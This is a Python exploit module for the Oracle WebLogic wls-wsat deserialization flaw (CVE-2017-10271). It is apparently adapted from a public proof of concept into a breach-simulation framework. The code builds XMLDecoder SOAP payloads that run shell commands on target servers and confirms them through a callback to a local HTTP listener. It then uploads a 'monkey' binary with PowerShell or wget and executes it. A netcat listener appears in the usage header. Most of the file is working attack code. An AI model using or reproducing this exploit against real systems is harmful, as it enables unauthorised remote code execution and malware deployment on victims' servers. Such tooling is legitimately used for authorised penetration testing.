#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Exploit Title: Weblogic wls-wsat Component Deserialization RCE
# Date Authored: Jan 3, 2018
# Date Announced: 10/19/2017
# Exploit Author: Kevin Kirsche (d3c3pt10n)
# Exploit Github: https://github.com/kkirsche/CVE-2017-10271
#     Exploit is based off of POC by Luffin from Github
#     https://github.com/Luffin/CVE-2017-10271
# Vendor Homepage: http://www.oracle.com/technetwork/middleware/weblogic/overview/index.html
# Version: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
# Tested on: Oracle WebLogic 10.3.6.0.0 running on Oracle Linux 6.8 and Ubuntu 14.04.4 LTS
# CVE: CVE-2017-10271
# Usage: python exploit.py -l 10.10.10.10 -p 4444 -r http://will.bepwned.com:7001/
#   (Python 3) Example check listener: python3 -m http.server 4444
#   (Python 2) Example check listener: python -m SimpleHTTPServer 4444
#   (Netcat) Example exploit listener: nc -nlvp 4444

from sys import exit
from requests import post, exceptions
from argparse import ArgumentParser
from random import choice
from string import ascii_uppercase, ascii_lowercase, digits
from xml.sax.saxutils import escape
from web_rce import WebRCE
from exploit.tools import HTTPTools, get_free_tcp_port, get_interface_to_target
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from model import POWERSHELL_HTTP_UPLOAD_NOT_ESCAPED, WGET_HTTP_UPLOAD, RDP_CMDLINE_HTTP

import threading
import logging
import copy
import re
import os
__author__ = "VakarisZ"

LOG = logging.getLogger(__name__)

DOWNLOAD_TIMEOUT = 300
# How long to wait for request to go to vuln machine and to our server from there
REQUEST_TIMEOUT = 1
# TODO fix testing
URLS = ["wls-wsat/CoordinatorPortType",
        "/wls-wsat/CoordinatorPortType11",
        "wls-wsat/ParticipantPortType",
        "/wls-wsat/ParticipantPortType11",
        "/wls-wsat/RegistrationPortTypeRPC",
        "/wls-wsat/RegistrationPortTypeRPC11",
        "/wls-wsat/RegistrationRequesterPortType",
        "/wls-wsat/RegistrationRequesterPortType11"]


class WebLogicExploiter(WebRCE):
    _TARGET_OS_TYPE = ['linux', 'windows']

    def __init__(self, host):
        super(WebLogicExploiter, self).__init__(host)

    def exploit_host(self):
        ports = []
        # Add Oracle web logic default port
        if WebRCE.check_if_port_open(self.host, 7001):
            ports.append(['7001', False])
            ports.append(['7001', True])
        # Get open ports
        ports2 = WebRCE.get_ports_w(self.host, self.HTTP, ["http"])
        # Merge custom and default ports
        if ports2:
            ports.append(ports2)
        if not ports:
            return False
        # Get urls to try to exploit
        urls = WebRCE.build_potential_urls(self.host, ports, URLS)

        exploiter = self.exploit

        #TODO maybe check all urls?
        vulnerable_urls = []
        for url in urls:
            # Get full URL
            if self.test_exploit(url):
                vulnerable_urls.append(url)
                break
        self._exploit_info['vulnerable_urls'] = vulnerable_urls
        if not vulnerable_urls:
            return False

        # We need to escape backslashes for our exploiter
        config = copy.deepcopy(self._config)
        config.dropper_target_path_win_32 = 'monkey.exe'
        config.dropper_target_path_win_64 = re.sub(r"\\", r"\\\\", config.dropper_target_path_win_64)

        data = WebRCE.upload_monkey(self.host, config, exploiter, vulnerable_urls[0],
                                    {'windows': POWERSHELL_HTTP_UPLOAD_NOT_ESCAPED,
                                     'linux': WGET_HTTP_UPLOAD})

        # We can't use 'if not' because response may be ''
        if data['response'] == False:
            return False

        if WebRCE.change_permissions(self.host, vulnerable_urls[0], exploiter, data['path']) == False:
            return False

        if WebRCE.execute_remote_monkey(self.host, vulnerable_urls[0], exploiter, data['path'], True) == False:
            return False

        return True

    def exploit(self, url, command):
        empty_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java>
                <object class="java.lang.ProcessBuilder">
                  <array class="java.lang.String" length="3" >
                    <void index="0">
                      <string>{cmd_base}</string>
                    </void>
                    <void index="1">
                      <string>{cmd_opt}</string>
                    </void>
                    <void index="2">
                      <string>{cmd_payload}</string>
                    </void>
                  </array>
                  <void method="start"/>
                </object>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
        '''
        if 'linux' in self.host.os['type']:
            cmd_base = '/bin/sh'
            cmd_opt = '-c'
        else:
            cmd_base = 'cmd'
            cmd_opt = '/c'

        # command = escape(command)
        # command = r"type NUL > C:\\Windows\\EmptyFile.txt"
        command = escape(command)

        payload = empty_payload.format(cmd_base=cmd_base, cmd_opt=cmd_opt, cmd_payload=command)
        headers = {
            "Content-Type":
                "text/xml;charset=UTF-8",
            "User-Agent":
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        }

        try:
            # TODO maybe put timeout as const
            req = post(url, data=payload, headers=headers, timeout=10, verify=True)
        except Exception as e:
            print('[!] Connection Error')
            print(e)
        return True

    class HTTPServer(threading.Thread):
        """
        Http server built for waitig GET requests. Because oracle web logic vuln is blind,
        we determine if we can exploit by either getting a GET request from host or not.
        """
        def __init__(self, local_ip, local_port, max_requests=1):
            self._local_ip = local_ip
            self._local_port = local_port
            self.get_requests = 0
            self.max_requests = max_requests
            self._stopped = False
            threading.Thread.__init__(self)

        def run(self):
            class S(BaseHTTPRequestHandler):
                @staticmethod
                def do_GET():
                    LOG.info('Server received a request from vulnerable machine')
                    self.get_requests += 1
            LOG.info('Server waiting for exploited machine request...')
            httpd = HTTPServer((self._local_ip, self._local_port), S)
            httpd.timeout = 5.5  # this is irrelevant?

            while not self._stopped and self.get_requests < self.max_requests:
                httpd.handle_request()

            self._stopped = True

        def stop(self, timeout=60):
            self._stopped = True
            self.join(timeout)

    def test_exploit(self, url):
        local_port = get_free_tcp_port()
        local_ip = get_interface_to_target(self.host.ip_addr)
        httpd = WebLogicExploiter.HTTPServer(local_ip, local_port)
        httpd.daemon = True
        httpd.start()

        generic_check_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.8" class="java.beans.XMLDecoder">
                <void id="url" class="java.net.URL">
                  <string>http://{lhost}:{lport}</string>
                </void>
                <void idref="url">
                  <void id="stream" method = "openStream" />
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
         <soapenv:Body/>
        </soapenv:Envelope>
        '''
        payload = generic_check_payload.format(lhost=local_ip, lport=local_port)
        headers = {
            "Content-Type":
                "text/xml;charset=UTF-8",
            "User-Agent":
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        }

        try:
            post(url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        except exceptions.ReadTimeout:
            pass
        except Exception as e:
            LOG.error("Something went wrong: %s" % e)
        httpd.join(2)
        httpd.stop()
        if httpd.get_requests > 0:
            exploited = True
        else:
            exploited = False
        return exploited
